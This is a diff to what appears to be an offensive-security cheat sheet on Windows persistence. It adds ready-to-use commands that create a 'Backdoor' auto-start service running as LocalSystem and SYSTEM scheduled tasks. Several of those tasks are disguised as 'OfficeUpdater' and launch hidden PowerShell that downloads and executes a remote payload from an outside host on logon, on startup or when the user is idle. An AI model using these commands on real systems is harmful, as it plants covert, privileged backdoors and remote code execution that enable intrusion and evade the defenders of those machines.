@@ -8,7 +8,7 @@
 * [Simple User](#simple-user)
     * [Registry HKCU](#registry-hkcu)
     * [Startup](#startup)
-    * [Scheduled Task](#scheduled-task)
+    * [Scheduled Tasks User](#scheduled-tasks-user)
     * [BITS Jobs](#bits-jobs)
 * [Serviceland](#serviceland)
     * [IIS](#iis)
@@ -17,8 +17,8 @@
     * [Registry HKLM](#registry-hklm)
         * [Winlogon Helper DLL](#)
         * [GlobalFlag](#)
-    * [Services](#services)
-    * [Scheduled Task](#scheduled-task)
+    * [Services Elevated](#services-elevated)
+    * [Scheduled Tasks Elevated](#scheduled-tasks-elevated)
     * [Binary Replacement](#binary-replacement)
         * [Binary Replacement on Windows XP+](#binary-replacement-on-windows-xp)
         * [Binary Replacement on Windows 10+](#binary-replacement-on-windows-10)
@@ -100,7 +100,7 @@ Using SharPersist
 SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
 ```
 
-### Scheduled Task
+### Scheduled Tasks User
 
 ```powershell
 PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
@@ -205,25 +205,61 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 ```
 
 
-### Services
+### Services Elevated
 
 Create a service that will start automatically or on-demand.
 
 ```powershell
-PS C:\> New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here."
+# Powershell
+New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Nothing to see here." -StartupType Automatic
+sc start pentestlab
+
+# SharPersist
+SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c backdoor.exe" -n "Backdoor" -m add
+
+# sc
+sc create Backdoor binpath= "cmd.exe /k C:\temp\backdoor.exe" start="auto" obj="LocalSystem"
+sc start Backdoor
 ```
 
-### Scheduled Tasks
+### Scheduled Tasks Elevated
 
-Scheduled Task to run as SYSTEM, everyday at 9am.
+Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.
+
+> Processes spawned as scheduled tasks have taskeng.exe process as their parent
 
 ```powershell
-PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Windows\Temp\backdoor.exe"
-PS C:\> $T = New-ScheduledTaskTrigger -Daily -At 9am
-PS C:\> $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
-PS C:\> $S = New-ScheduledTaskSettingsSet
-PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
-PS C:\> Register-ScheduledTask Backdoor -InputObject $D
+# Powershell
+$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\backdoor.exe"
+$T = New-ScheduledTaskTrigger -Daily -At 9am
+# OR
+$T = New-ScheduledTaskTrigger -Daily -At "9/30/2020 11:05:00 AM"
+$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
+$S = New-ScheduledTaskSettingsSet
+$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+Register-ScheduledTask "Backdoor" -InputObject $D
+
+# Native schtasks
+schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
+schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
+
+##(X86) - On User Login
+schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
+ 
+##(X86) - On System Start
+schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
+ 
+##(X86) - On User Idle (30mins)
+schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
+ 
+##(X64) - On User Login
+schtasks /create /tn OfficeUpdaterA /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onlogon /ru System
+ 
+##(X64) - On System Start
+schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onstart /ru System
+ 
+##(X64) - On User Idle (30mins)
+schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 ```
 
 ### Binary Replacement
